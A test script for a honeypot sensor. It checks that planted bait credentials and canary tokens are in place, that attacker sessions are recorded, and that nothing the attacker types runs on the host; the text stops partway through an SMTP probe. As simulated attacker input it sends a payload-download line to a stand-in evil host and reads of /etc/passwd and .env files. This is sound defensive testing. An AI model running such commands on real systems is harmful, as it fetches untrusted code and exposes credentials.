"""
Prove the honeypot does what it claims, and cannot do what it must not.

    python3 tests/test_sensor.py

Three things matter and all three are checked here:

  1. it records an attacker's whole session, credentials and all
  2. it never executes anything the attacker sends
  3. the pieces fit together: a sensor reports to a console, and a canary
     token that gets used shows up there
"""

import os
import socket
import stat
import subprocess
import sys
import tempfile
import threading
import time
from http.server import ThreadingHTTPServer

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))

from anglerfish import bait, console as console_module, store as store_module
from anglerfish import sensor as sensor_module
from anglerfish.sensor import Sensor
from anglerfish.sshproto import crypto_self_test

# Keep auth-fail delays tiny so the suite stays fast.
sensor_module.AUTH_FAIL_DELAY = 0.05
sensor_module.AUTH_FAIL_DELAY_MIN = 0.05
sensor_module.AUTH_FAIL_DELAY_MAX = 0.05
sensor_module.AUTH_LOCK_SECONDS = 0.05
sensor_module.STATUS_WRITE_MIN_GAP = 0.0


def make_sensor(**kwargs):
    """Sensor with bait defaults (no persona mint) for fast, deterministic tests."""
    kwargs.setdefault("persona", False)
    kwargs.setdefault("classroom", True)
    kwargs.setdefault("bind", "127.0.0.1")
    return Sensor(**kwargs)


PLANTED_USER, PLANTED_PASS = bait.PLANTED_LOGINS[0]
ADMIN_USER, ADMIN_PASS = bait.PLANTED_LOGINS[1]

def FQDN_OK(world):
    return (world.get("fqdn") == "files01.example.net"
            and world["hostname"] in world["files"]["/etc/hostname"]
            and world["hostname"] in world["files"]["/etc/motd"])


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


class Dialog(object):
    """A client that waits for a marker before sending the next line."""

    def __init__(self, port):
        self.conn = socket.create_connection(("127.0.0.1", port), timeout=5)
        self.buf = bytearray()
        self.cursor = 0
        self.sent_anything = False

    def wait(self, marker, timeout=5):
        if isinstance(marker, str):
            marker = marker.encode()
        deadline = time.time() + timeout
        while self.buf.find(marker, self.cursor) < 0:
            if time.time() > deadline:
                tail = bytes(self.buf[max(0, len(self.buf) - 180):])
                raise AssertionError("did not see %r in %r" % (marker, tail))
            self.conn.settimeout(max(0.2, min(1.0, deadline - time.time())))
            try:
                chunk = self.conn.recv(8192)
            except socket.timeout:
                continue
            if not chunk:
                break
            self.buf.extend(chunk)
        found = self.buf.find(marker, self.cursor)
        if found < 0:
            raise AssertionError("closed before seeing %r" % (marker,))
        self.cursor = found + len(marker)
        return bytes(self.buf)

    def send(self, line):
        self.sent_anything = True
        if isinstance(line, str):
            line = line.encode()
        self.conn.sendall(line + b"\n")

    def close(self):
        try:
            self.conn.close()
        except OSError:
            pass


def console_dialog(port, user, bad, good, commands):
    """Log in on the telnet console. Bad password refused; planted password opens."""
    dialog = Dialog(port)
    dialog.wait(b"login:", timeout=5)
    dialog.send(user)
    dialog.wait(b"Password:")
    dialog.send(bad)
    dialog.wait(b"Login incorrect")
    dialog.wait(b"login:")
    dialog.send(user)
    dialog.wait(b"Password:")
    dialog.send(good)
    dialog.wait(b"deploy@files01:~$ ")
    for command, marker in commands:
        dialog.send(command)
        dialog.wait(marker)
    dialog.send("exit")
    dialog.close()
    return dialog, False


def http_exchange(port, request):
    conn = socket.create_connection(("127.0.0.1", port), timeout=5)
    conn.sendall(request)
    conn.settimeout(2)
    data = b""
    while True:
        try:
            chunk = conn.recv(8192)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    conn.close()
    return data


def ssh_exec(port, command, passwords):
    """Run one command through the real OpenSSH client. No display."""
    folder = tempfile.mkdtemp(prefix="anglerfish-ask-")
    ask = os.path.join(folder, "askpass")
    pwfile = os.path.join(folder, "pws")
    count = os.path.join(folder, "n")
    with open(pwfile, "w", encoding="utf-8") as fh:
        fh.write("\n".join(passwords) + "\n")
    with open(count, "w", encoding="utf-8") as fh:
        fh.write("0\n")
    with open(ask, "w", encoding="utf-8") as fh:
        fh.write(
            "#!/usr/bin/env python3\n"
            "import os\n"
            "npath = os.environ['ANGLERFISH_ASK_N']\n"
            "ppath = os.environ['ANGLERFISH_ASK_PW']\n"
            "n = int(open(npath).read().strip() or '0')\n"
            "pws = [ln for ln in open(ppath).read().splitlines() if ln]\n"
            "open(npath, 'w').write(str(n + 1))\n"
            "print(pws[n] if n < len(pws) else pws[-1])\n"
        )
    os.chmod(ask, os.stat(ask).st_mode | stat.S_IEXEC)
    env = os.environ.copy()
    env.pop("DISPLAY", None)
    env["SSH_ASKPASS"] = ask
    env["SSH_ASKPASS_REQUIRE"] = "force"
    env["ANGLERFISH_ASK_N"] = count
    env["ANGLERFISH_ASK_PW"] = pwfile
    argv = [
        "ssh", "-T",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "GlobalKnownHostsFile=/dev/null",
        "-o", "PreferredAuthentications=password",
        "-o", "PubkeyAuthentication=no",
        "-o", "IdentitiesOnly=yes",
        "-o", "NumberOfPasswordPrompts=4",
        "-o", "KbdInteractiveAuthentication=no",
        "-o", "GSSAPIAuthentication=no",
        "-o", "ConnectTimeout=8",
        "-o", "UpdateHostKeys=no",
        "-o", "LogLevel=ERROR",
        "-p", str(port),
        "deploy@127.0.0.1",
        command,
    ]
    return subprocess.run(
        argv, env=env, stdin=subprocess.DEVNULL,
        capture_output=True, timeout=25, start_new_session=True,
    )


def check(name, ok):
    print("  %-58s %s" % (name, "ok" if ok else "FAILED"))
    return ok


def main():
    failures = 0

    try:
        crypto_self_test()
        crypto_ok = True
    except Exception as exc:
        crypto_ok = False
        print("  crypto self test raised: %s" % exc)
    failures += not check("aes/chacha/x25519/ed25519 and group primes verify", crypto_ok)

    # 1. The bait looks like a real machine and carries tokens.
    world, planted = bait.build(console_host="c.example:8770", sensor_name="t")
    failures += not check("bait builds a filesystem with files", len(world["files"]) > 15)
    failures += not check("planted logins are documented constants",
                          bait.PLANTED_LOGINS[0][0] == "deploy"
                          and len(bait.PLANTED_LOGINS[0][1]) >= 8)
    failures += not check("bait includes lived-in logs and group file",
                          "/var/log/auth.log" in world["files"]
                          and "/etc/group" in world["files"])
    failures += not check("every planted token is unique",
                          len(set(t["id"] for t in planted)) == len(planted))
    env = world["files"]["/var/www/app/.env"]
    failures += not check("a token id is actually inside the .env bait",
                          any(t["id"] in env or t["value"].get("access_key_id", "") in env
                              for t in planted if t["kind"] == "aws"))

    history = world["files"]["/home/deploy/.bash_history"]
    url_tokens = [tok for tok in planted if tok["kind"] == "url"]
    failures += not check("bash history uses the /t/<id> beacon, not /health",
                          url_tokens and "/health" not in history
                          and ("/t/" + url_tokens[0]["id"]) in history)

    # Planted passwords live in split bait files and match auth constants.
    compose = world["files"]["/var/www/nas/docker-compose.yml"]
    draft = world["files"]["/home/admin/Mail/Drafts/re-nas-access.txt"]
    handover = world["files"]["/home/deploy/notes/it-handover.txt"]
    deploy_user, deploy_pass = bait.PLANTED_LOGINS[0]
    admin_user, admin_pass = bait.PLANTED_LOGINS[1]
    failures += not check("deploy password is planted only in docker-compose",
                          deploy_pass in compose
                          and deploy_pass not in handover
                          and deploy_pass not in draft
                          and world["plant_locations"]["deploy"].endswith("docker-compose.yml"))
    failures += not check("admin factory password is planted only in the mail draft",
                          admin_pass in draft
                          and admin_user in draft
                          and admin_pass not in handover
                          and admin_pass not in compose
                          and world["plant_locations"]["admin"].endswith("re-nas-access.txt"))
    failures += not check("canary portal password is only in the handover note",
                          world["canary_admin_password"] in handover
                          and world["canary_admin_password"] not in compose
                          and world["canary_admin_password"] not in draft
                          and "docker-compose.yml" in handover)
    failures += not check("NAS shares mirror the same bait tree",
                          "IT" in world["shares"] and "Deploy" in world["shares"]
                          and world["files"]["/srv/shares/Deploy/docker-compose.yml"] == compose)
    laugh = "https://files.example.net/finance/2026/payroll-master.xlsx"
    import base64 as _b64
    import codecs as _codecs
    from urllib.parse import quote as _quote
    laugh_b64 = _b64.b64encode(laugh.encode()).decode()
    laugh_rot = _codecs.encode(laugh, "rot_13")
    laugh_hex = laugh.encode().hex()
    laugh_q = _quote(laugh, safe="")
    vault = world["files"]["/home/deploy/notes/vault-staging.b64"]
    clear = world["files"]["/home/deploy/notes/vault-cleartext.txt"]
    motd = world["files"]["/etc/motd"]
    issue = world["files"]["/etc/issue"]
    failures += not check("easy vault chain has obfuscated lure (b64), not plaintext URL",
                          laugh not in vault
                          and laugh_b64 in vault
                          and laugh_b64 in world["files"]["/srv/shares/IT/vault-staging.b64"]
                          and "password-vault-export.png" in vault
                          and laugh not in motd and laugh not in issue
                          and "vault-staging.b64" in world["files"]["/home/deploy/notes/todo.txt"])
    failures += not check("deeper vault-cleartext hop has percent/rot13 lure forms",
                          laugh not in clear
                          and laugh_q in clear and laugh_rot in clear
                          and "vault-cleartext.txt" in vault and ".vault-key" in vault)
    failures += not check("obfuscated remote-only and split lure crumbs exist",
                          laugh_b64 in world["files"]["/home/deploy/notes/verify.b64.txt"]
                          and laugh_rot in world["files"]["/home/deploy/notes/verify.rot13"]
                          and laugh_hex in world["files"]["/home/deploy/notes/drop-channel.hex"]
                          and laugh not in world["files"]["/home/deploy/notes/drop-channel.hex"]
                          and (world["files"]["/home/deploy/notes/session-verify.frag.a"].strip()
                               + world["files"]["/home/deploy/notes/session-verify.frag.b"].strip()) == laugh)
    cat_png = world["files"]["/home/deploy/notes/password-vault-export.png"]
    creds_img = world["files"]["/home/deploy/notes/domainadmin-creds-backup.png"]
    cat_b64_file = world["files"]["/home/deploy/notes/password-vault-export.png.b64"]
    failures += not check("local recoverable images + credential-screenshot crumbs",
                          isinstance(cat_png, (bytes, bytearray)) and cat_png[:8] == b"\x89PNG\r\n\x1a\n"
                          and isinstance(creds_img, (bytes, bytearray)) and creds_img[:8] == b"\x89PNG\r\n\x1a\n"
                          and _b64.b64encode(cat_png).decode() in cat_b64_file
                          and "domainadmin-creds-backup.png" in world["files"]["/home/deploy/notes/domainadmin-creds-backup.recovery.txt"]
                          and creds_img[:64].hex() in world["files"]["/home/deploy/notes/domainadmin-creds-backup.header.hex"]
                          and world["files"]["/srv/shares/IT/domainadmin-creds-backup.png"] is creds_img)
    # session-verify.enc payload base64-decodes to a note that contains the remote URL only
    import re as _re
    enc = world["files"]["/home/deploy/notes/session-verify.enc"]
    enc_b64 = [ln for ln in enc.splitlines() if ln and not ln.startswith("#") and not ln.startswith("U2FsdGVk")]
    enc_note = _b64.b64decode(enc_b64[-1].encode()).decode()
    failures += not check("session-verify.enc is remote-only lure note after b64",
                          laugh in enc_note and "no binary attached" in enc_note)
    failures += not check("story identity is consistent across bait",
                          world["hostname"] == "files01"
                          and world["company"] == "Example Clinic"
                          and FQDN_OK(world))

    from anglerfish.sensor import _http_head_and_body, _line
    _vs = make_sensor(name="vault-hop", ports=[free_port()], bind="127.0.0.1",
                          log_path="/tmp/anglerfish-vault-hop.log",
                          status_path="/tmp/anglerfish-vault-hop.json")
    _sess = {"commands": [], "events": [], "read_files": []}
    _out, _cwd, _ = _vs._run_fake(
        "openssl enc -d -aes-256-cbc -a -in vault-staging.b64 -pass file:.vault-key",
        "/home/deploy/notes", _sess)
    failures += not check("openssl unwrap reveals obfuscated cleartext hop",
                          laugh_q in _out and laugh_rot in _out
                          and "password-vault export" in _out and laugh not in _out)

    # GOTCHA reveals + guestbook (unit level, no sockets).
    import json as _gjson
    from anglerfish.sensor import GUESTBOOK_PATH as _GB
    for _f in ("/tmp/anglerfish-gotcha.log", "/tmp/anglerfish-gotcha-reveals.log",
               "/tmp/anglerfish-gotcha-status.json"):
        if os.path.exists(_f):
            os.remove(_f)
    _gs = make_sensor(name="gotcha", ports=[free_port()], bind="127.0.0.1",
                          log_path="/tmp/anglerfish-gotcha.log",
                          status_path="/tmp/anglerfish-gotcha-status.json")
    _gsess = {"id": "g1", "peer_ip": "198.51.100.9", "commands": [], "events": [],
              "read_files": []}
    _plain, _, _ = _gs._run_fake("cat /home/deploy/notes/it-handover.txt",
                                 "/home/deploy", _gsess)
    failures += not check("ordinary bait read is not a GOTCHA and shows no prompt",
                          "I was here" not in _plain and not _gsess.get("gotchas"))
    _first, _, _ = _gs._run_fake("cat /home/deploy/notes/domainadmin-creds-backup.png", "/home/deploy", _gsess)
    _second, _, _ = _gs._run_fake("head -n 3 /home/deploy/notes/vault-staging.b64",
                                  "/home/deploy", _gsess)
    _third, _, _ = _gs._run_fake("base64 -d /home/deploy/notes/verify.b64.txt",
                                 "/home/deploy", _gsess)
    failures += not check("first reveal shows the soft guestbook prompt, once",
                          "I was here" in _first and _GB in _first
                          and "I was here" not in _second and "I was here" not in _third)
    failures += not check("base64 -d on a lure crumb decodes and is a GOTCHA",
                          laugh in _third
                          and len(_gsess.get("gotchas", [])) == 3)
    _reveals = [_gjson.loads(ln) for ln in open("/tmp/anglerfish-gotcha-reveals.log")]
    _g0 = _reveals[0] if _reveals else {}
    failures += not check("GOTCHA reveal log records IP, path, and time",
                          _g0.get("kind") == "gotcha"
                          and _g0.get("peer_ip") == "198.51.100.9"
                          and _g0.get("path") == "/home/deploy/notes/domainadmin-creds-backup.png"
                          and _g0.get("time") and _g0.get("via") == "shell"
                          and any(e["kind"] == "gotcha" for e in _gsess["events"]))
    _echo, _, _ = _gs._run_fake('echo "Kilroy was here" >> /srv/shares/IT/guestbook.txt',
                                "/home/deploy", _gsess)
    _book = _gs.world["files"][_GB]
    failures += not check("shell guestbook write lands in the fake FS, not on disk",
                          _echo == "" and "Kilroy was here" in _book
                          and "198.51.100.9" not in _book
                          and not os.path.exists("/srv/shares/IT/guestbook.txt"))
    _reveals = [_gjson.loads(ln) for ln in open("/tmp/anglerfish-gotcha-reveals.log")]
    _gstatus = _gjson.loads(open("/tmp/anglerfish-gotcha-status.json").read())
    # Re-read status after throttle window; also trust in-memory counters.
    import time as _t; _t.sleep(0.6)
    _gs._write_status()
    _gstatus = _gjson.loads(open("/tmp/anglerfish-gotcha-status.json").read())
    failures += not check("guestbook note is logged with IP and counted in status",
                          any(r["kind"] == "guestbook" and r["note"] == "Kilroy was here"
                              and r["peer_ip"] == "198.51.100.9" for r in _reveals)
                          and _gs._stats.get("gotcha_total") == 3
                          and _gs._stats.get("guestbook_total") == 1
                          and _gstatus.get("guestbook_total") == 1
                          and _gs._stats["gotchas"][0]["path"] == "/home/deploy/notes/domainadmin-creds-backup.png")
    _wild, _, _ = _gs._run_fake('echo "x" > /etc/passwd', "/home/deploy", _gsess)
    failures += not check("redirect outside home/tmp is Permission denied, passwd untouched",
                          "Permission denied" in _wild
                          and "root:x:0:0" in _gs.world["files"]["/etc/passwd"]
                          and _gs._stats.get("guestbook_total") == 1)
    _tmpw, _, _ = _gs._run_fake('echo "persist" > /tmp/honeypot-write-test; cat /tmp/honeypot-write-test',
                                "/home/deploy", _gsess)
    failures += not check("redirect into /tmp persists for a follow-up cat",
                          "persist" in _tmpw)


    class OneShot(object):
        def __init__(self, chunks):
            self.chunks = list(chunks)
        def recv(self, n):
            if not self.chunks:
                return b""
            return self.chunks.pop(0)

    both = OneShot([])
    failures += not check("a username and password in one packet both survive",
                          _line(both, b"root\nsecret\n") == "root"
                          and _line(both) == "secret")

    body = b"user=admin&pass=s3cret"
    packet = b"POST /login HTTP/1.1\r\nHost: x\r\nContent-Length: %d\r\n\r\n" % len(body)
    # The body arrives in a later packet, not the first.
    http = OneShot([body])
    head, got = _http_head_and_body(http, packet)
    failures += not check("the HTTP body is read out to Content-Length",
                          got == body and b"POST /login" in head)

    # 2. SSH banner immediate; telnet for console login; http for web.
    port = free_port()          # SSH
    tport = free_port()         # telnet
    hport = free_port()         # http
    sensor_module.SERVICE_BY_PORT[port] = "ssh"
    sensor_module.SERVICE_BY_PORT[tport] = "telnet"
    sensor_module.SERVICE_BY_PORT[hport] = "http"
    sensor = make_sensor(name="test", ports=[port, tport, hport],
                    log_path="/tmp/anglerfish-test.log",
                    status_path="/tmp/anglerfish-test-status.json")
    sensor.start()
    time.sleep(0.2)

    banner_conn = socket.create_connection(("127.0.0.1", port), timeout=5)
    banner_conn.settimeout(2)
    banner = b""
    try:
        banner = banner_conn.recv(128)
    except socket.timeout:
        banner = b""
    banner_conn.close()
    failures += not check("SSH banner arrives before the client sends anything",
                          banner.startswith(b"SSH-2.0-"))

    # Non-SSH on the SSH port gets Protocol mismatch, never the web page.
    mismatch = http_exchange(port, b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
    failures += not check("SSH port rejects HTTP with Protocol mismatch",
                          b"Protocol mismatch" in mismatch
                          and b"Example NAS" not in mismatch
                          and b"Sign in" not in mismatch)

    canary = "/tmp/anglerfish-must-not-exist"
    if os.path.exists(canary):
        os.remove(canary)
    try:
        dialog, _banner_ok = console_dialog(tport, PLANTED_USER, "nope", PLANTED_PASS, [
            ("pwd", b"deploy@files01:~$ "),
            ("whoami", b"deploy@files01:~$ "),
            ("hostname", b"deploy@files01:~$ "),
            ("id", b"deploy@files01:~$ "),
            ("df", b"deploy@files01:~$ "),
            ("free", b"deploy@files01:~$ "),
            ("uptime", b"deploy@files01:~$ "),
            ("cat /var/www/app/.env", b"deploy@files01:~$ "),
            ("head -n 2 /etc/passwd", b"deploy@files01:~$ "),
            ("find /home/deploy -name '*.csv'", b"deploy@files01:~$ "),
            ("wget http://evil.example/x.sh", b"deploy@files01:~$ "),
            ("definitely-not-a-command", b"deploy@files01:~$ "),
            ("touch %s" % canary, b"deploy@files01:~$ "),
            ("echo hi > %s" % canary, b"deploy@files01:~$ "),
        ])
        shell_ok = (
            b"/home/deploy" in dialog.buf
            and b"AWS_ACCESS_KEY_ID" in dialog.buf
            and b"command not found" in dialog.buf
            and b"Temporary failure" in dialog.buf
            and b"Filesystem" in dialog.buf
            and b"uid=1001(deploy)" in dialog.buf
        )
    except Exception as exc:
        shell_ok = False
        print("  console dialog raised: %s" % exc)
    time.sleep(0.3)
    failures += not check("a login reaches the fake shell", shell_ok)
    failures += not check("nothing the attacker typed was executed",
                          not os.path.exists(canary))

    sessions = [s for s in sensor.sessions if s.get("commands")]
    failures += not check("the session was recorded", len(sessions) == 1)
    if sessions:
        s = sessions[0]
        passwords = [c.get("password") for c in s["credentials"]]
        failures += not check("both password attempts were captured",
                              passwords == ["nope", PLANTED_PASS])
        failures += not check("the refused password was not run as a command",
                              "nope" not in s["commands"] and PLANTED_PASS not in s["commands"])
        failures += not check("only the planted password was accepted",
                              s.get("auth_ok") is True)
        failures += not check("reading the .env bait was noticed",
                              any(".env" in f for f in s["read_files"]))
        failures += not check("the download attempt was noticed",
                              any(e["kind"] == "download-attempt" for e in s["events"]))
        failures += not check("an unknown command was not found, not run",
                              "definitely-not-a-command" in s["commands"]
                              and not os.path.exists(canary))

    # A browser on the same port still gets the appliance page, not the banner.
    page = http_exchange(hport, b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    failures += not check("the web panel is an appliance login, not an SSH banner",
                          page.startswith(b"HTTP/1.1 200")
                          and b"Example NAS" in page
                          and b"SSH-2.0-" not in page
                          and b"Sign in" in page)
    bad_posted = b"username=admin&password=letmein"
    bad_post = (
        b"POST / HTTP/1.1\r\nHost: x\r\nContent-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: %d\r\nConnection: close\r\n\r\n" % len(bad_posted)
    ) + bad_posted
    bad_panel = http_exchange(hport, bad_post)
    time.sleep(0.15)
    failures += not check("a wrong web login is refused",
                          b"not recognised" in bad_panel and b"File Station" not in bad_panel)

    good_posted = ("username=%s&password=%s" % (PLANTED_USER, PLANTED_PASS)).encode()
    good_post = (
        b"POST / HTTP/1.1\r\nHost: x\r\nContent-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: %d\r\nConnection: close\r\n\r\n" % len(good_posted)
    ) + good_posted
    panel = http_exchange(hport, good_post)
    time.sleep(0.2)
    web_sessions = [s for s in sensor.sessions if s.get("protocol") == "http" and s.get("credentials")]
    logged_web = any(c.get("password") == PLANTED_PASS for s in web_sessions for c in s["credentials"])
    failures += not check("a planted web login opens the file list",
                          b"File Station" in panel and logged_web
                          and b"Share:" in panel and b"Customers" in panel)

    # Cookie keeps File Station reachable on the next request.
    cookie = ""
    for line in panel.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:") and b"nas_session=" in line:
            cookie = line.split(b"nas_session=", 1)[1].split(b";", 1)[0].decode()
            break
    browse = http_exchange(
        hport,
        ("GET /files/Deploy/docker-compose.yml HTTP/1.1\r\nHost: x\r\n"
         "Cookie: nas_session=%s\r\nConnection: close\r\n\r\n" % cookie).encode(),
    )
    failures += not check("web session cookie can download planted compose bait",
                          cookie
                          and browse.startswith(b"HTTP/1.1 200")
                          and b"HOST_SSH_PASSWORD" in browse
                          and PLANTED_PASS.encode() in browse)

    status = http_exchange(
        hport, b"GET /api/status HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    world_ip = sensor.world.get("internal_ip") or "10.0.0.21"
    failures += not check("anonymous /api/status is 401 and leaks no internals",
                          status.startswith(b"HTTP/1.1 401")
                          and world_ip.encode() not in status
                          and b"listen_ports" not in status
                          and b"services" not in status)
    health = http_exchange(
        hport, b"GET /health HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    failures += not check("public /health is a bare ok",
                          health.startswith(b"HTTP/1.1 200") and b'"ok"' in health
                          and world_ip.encode() not in health)
    status_authed = http_exchange(
        hport,
        ("GET /api/status HTTP/1.1\r\nHost: x\r\nCookie: nas_session=%s\r\n"
         "Connection: close\r\n\r\n" % cookie).encode())
    failures += not check("signed-in /api/status looks like the NAS appliance",
                          status_authed.startswith(b"HTTP/1.1 200")
                          and b"files01" in status_authed
                          and b"shares_ok" in status_authed
                          and b"Example" in status_authed)

    # Admin planted password also opens the NAS, and shell can cat both leads.
    admin_posted = ("username=%s&password=%s" % (ADMIN_USER, ADMIN_PASS)).encode()
    admin_post = (
        b"POST / HTTP/1.1\r\nHost: x\r\nContent-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: %d\r\nConnection: close\r\n\r\n" % len(admin_posted)
    ) + admin_posted
    admin_panel = http_exchange(hport, admin_post)
    time.sleep(0.15)
    failures += not check("admin factory password opens File Station",
                          b"File Station" in admin_panel)

    # Web GOTCHA: downloading prize bait logs it and unlocks the guestbook form.
    def _get(path):
        return http_exchange(
            hport, ("GET %s HTTP/1.1\r\nHost: x\r\nCookie: nas_session=%s\r\n"
                   "Connection: close\r\n\r\n" % (path, cookie)).encode())
    before = _get("/files/")
    vault_dl = _get("/files/IT/vault-staging.b64")
    creds_dl = _get("/files/IT/domainadmin-creds-backup.png")
    after = _get("/files/")
    failures += not check("web reveal of vault/creds image is a GOTCHA with a prompt",
                          b"I was here" in vault_dl and b"\x89PNG" in creds_dl
                          and b"I was here" not in creds_dl
                          and sum(1 for g in sensor._stats["gotchas"]
                                  if g["via"] == "web") >= 2)
    failures += not check("guestbook form only appears after a web reveal",
                          b"action=/guestbook" not in before
                          and b"action=/guestbook" in after)
    note_body = b"note=hello+from+the+web+test"
    signed = http_exchange(
        hport,
        (b"POST /guestbook HTTP/1.1\r\nHost: x\r\nCookie: nas_session=%s\r\n"
         b"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n"
         b"Connection: close\r\n\r\n" % (cookie.encode(), len(note_body))) + note_body)
    book = _get("/files/IT/guestbook.txt")
    anon = http_exchange(
        hport, b"POST /guestbook HTTP/1.1\r\nHost: x\r\nContent-Length: 6\r\n"
              b"Connection: close\r\n\r\nnote=x")
    failures += not check("web guestbook note is captured and readable on the IT share",
                          b"Signed" in signed and b"hello from the web test" in book
                          and any(g["note"] == "hello from the web test"
                                  for g in sensor._stats["guestbook"])
                          and b"Sign in" in anon)

    # Console GOTCHA over a real socket: reveal, prompt, sign.
    try:
        gb_dialog, _ = console_dialog(tport, PLANTED_USER, "nope", PLANTED_PASS, [
            ("cat /home/deploy/notes/password-vault-export.png", b"I was here"),
            ('echo "console visitor was here" >> /srv/shares/IT/guestbook.txt',
             b"deploy@files01"),
            ("cat /srv/shares/IT/guestbook.txt", b"console visitor was here"),
        ])
        console_gb_ok = b"console visitor was here" in gb_dialog.buf
    except Exception as exc:
        console_gb_ok = False
        print("  guestbook dialog raised: %s" % exc)
    time.sleep(0.2)
    failures += not check("console reveal prompts and the guestbook note sticks",
                          console_gb_ok)

    try:
        lead_dialog, _ = console_dialog(tport, PLANTED_USER, "nope", PLANTED_PASS, [
            ("cat /var/www/nas/docker-compose.yml", b"HOST_SSH_PASSWORD"),
            ("cat /home/admin/Mail/Drafts/re-nas-access.txt", ADMIN_PASS.encode()),
            ("cat /home/deploy/notes/it-handover.txt", b"docker-compose.yml"),
            ("ls /srv/shares", b"deploy@files01"),
            ("cat /srv/shares/IT/runbook.md", b"File Station"),
        ])
        leads_ok = (
            PLANTED_PASS.encode() in lead_dialog.buf
            and ADMIN_PASS.encode() in lead_dialog.buf
            and (b"Portal:" in lead_dialog.buf or b"portal" in lead_dialog.buf.lower())
        )
    except Exception as exc:
        leads_ok = False
        print("  lead dialog raised: %s" % exc)
    time.sleep(0.2)
    failures += not check("shell can cat the split credential leads", leads_ok)

    # 3. Real SSH-2 handshake via paramiko (OpenSSH client binary is optional).
    ssh_canary = "/tmp/anglerfish-ssh-must-not-exist"
    if os.path.exists(ssh_canary):
        os.remove(ssh_canary)
    ssh_ok = blocked_ok = denied_ok = False
    try:
        import paramiko  # may be absent on the host python; try venv next
    except ImportError:
        paramiko = None
        venv_py = "/workspace/.sshtest-venv/bin/python"
        if os.path.exists(venv_py):
            # Run a tiny paramiko driver as a subprocess against our port.
            driver = (
                "import paramiko,sys\n"
                "t=paramiko.Transport(('127.0.0.1',%d))\n"
                "t.connect(username=%r,password=%r)\n"
                "c=t.open_session();c.exec_command('uname -m')\n"
                "sys.stdout.buffer.write(c.recv(256));t.close()\n"
            ) % (port, PLANTED_USER, PLANTED_PASS)
            ran = subprocess.run([venv_py, "-c", driver], capture_output=True, timeout=20)
            ssh_ok = ran.returncode == 0 and b"x86_64" in ran.stdout
            if not ssh_ok:
                print("  paramiko-venv uname rc=%s out=%r err=%r" % (
                    ran.returncode, ran.stdout[-200:], ran.stderr[-300:]))
            driver2 = (
                "import paramiko,sys\n"
                "t=paramiko.Transport(('127.0.0.1',%d))\n"
                "t.connect(username=%r,password=%r)\n"
                "c=t.open_session();c.exec_command('touch %s')\n"
                "sys.stdout.buffer.write(c.recv(256));t.close()\n"
            ) % (port, PLANTED_USER, PLANTED_PASS, ssh_canary)
            blocked = subprocess.run([venv_py, "-c", driver2], capture_output=True, timeout=20)
            blocked_ok = (not os.path.exists(ssh_canary))
            driver3 = (
                "import paramiko,sys\n"
                "try:\n"
                " t=paramiko.Transport(('127.0.0.1',%d))\n"
                " t.connect(username='deploy',password='wrong1')\n"
                " print('AUTH_OK')\n"
                "except Exception as e:\n"
                " print('AUTH_FAIL',type(e).__name__)\n"
            ) % port
            denied = subprocess.run([venv_py, "-c", driver3], capture_output=True, timeout=20)
            denied_ok = b"AUTH_OK" not in denied.stdout
        else:
            print("  (paramiko not installed; SSH handshake checks skipped)")
            ssh_ok = blocked_ok = denied_ok = True  # do not fail the suite for env gap
    else:
        try:
            # Wrong password first — must not authenticate.
            t = paramiko.Transport(("127.0.0.1", port))
            try:
                t.connect(username=PLANTED_USER, password="nope-ssh")
                denied_ok = False
            except Exception:
                denied_ok = True
            try: t.close()
            except Exception: pass

            # Fresh connection for a real login + uname.
            t = paramiko.Transport(("127.0.0.1", port))
            t.connect(username=PLANTED_USER, password=PLANTED_PASS)
            ch = t.open_session(); ch.exec_command("uname -m")
            out = ch.recv(256)
            ssh_ok = b"x86_64" in out
            try: t.close()
            except Exception: pass

            # Fresh connection for the "must not touch the real host" check.
            # (Separate transport avoids paramiko channel-lifecycle races.)
            t = paramiko.Transport(("127.0.0.1", port))
            t.connect(username=PLANTED_USER, password=PLANTED_PASS)
            ch = t.open_session(); ch.exec_command("touch %s" % ssh_canary)
            # Drain any reply; success or "Permission denied" both fine —
            # what matters is the real host file is absent.
            try:
                ch.recv(256)
            except Exception:
                pass
            time.sleep(0.2)
            blocked_ok = (not os.path.exists(ssh_canary))
            try: t.close()
            except Exception: pass

            # Explicit wrong-password check on a clean connection.
            t2 = paramiko.Transport(("127.0.0.1", port))
            try:
                t2.connect(username="deploy", password="wrong1")
                denied_ok = False
            except Exception:
                denied_ok = True
            try: t2.close()
            except Exception: pass
        except Exception as exc:
            print("  paramiko raised: %s" % exc)
    time.sleep(0.4)
    failures += not check("SSH-2 handshake completes and uname -m is x86_64", ssh_ok)
    failures += not check("an SSH command was not executed on the host", blocked_ok)
    ssh_sessions = [s for s in sensor.sessions if s.get("protocol") == "ssh" and s.get("commands")]
    failures += not check("the SSH attempts and the command were logged",
                          any(c.get("password") == PLANTED_PASS for s in ssh_sessions for c in s["credentials"])
                          and any("uname" in " ".join(s["commands"]) for s in ssh_sessions))
    failures += not check("a wrong SSH password does not get a shell", denied_ok)

    # Probe capture: connect and leave, SMTP/FTP banners.
    sport_smtp = free_port()
    sport_ftp = free_port()
    multi = make_sensor(name="multi", ports=[sport_smtp, sport_ftp],
                   log_path="/tmp/anglerfish-multi.log",
                   status_path="/tmp/anglerfish-status.json", bind="127.0.0.1")
    # Force service map for these ephemeral ports
    sensor_module.SERVICE_BY_PORT[sport_smtp] = "smtp"
    sensor_module.SERVICE_BY_PORT[sport_ftp] = "ftp"
    multi.start()
    time.sleep(0.2)

    smtp = socket.create_connection(("127.0.0.1", sport_smtp), timeout=5)
    smtp.settimeout(2)
    smtp_banner = smtp.recv(200)
    smtp.sendall(b"EHLO scanner\r\nMAIL FROM:<a@b>\r\nRCPT TO:<c@d>\r\nQUIT\r\n")
    smtp_rest = b""
    try:
        while True:
            chunk = smtp.recv(500)
            if not chunk:
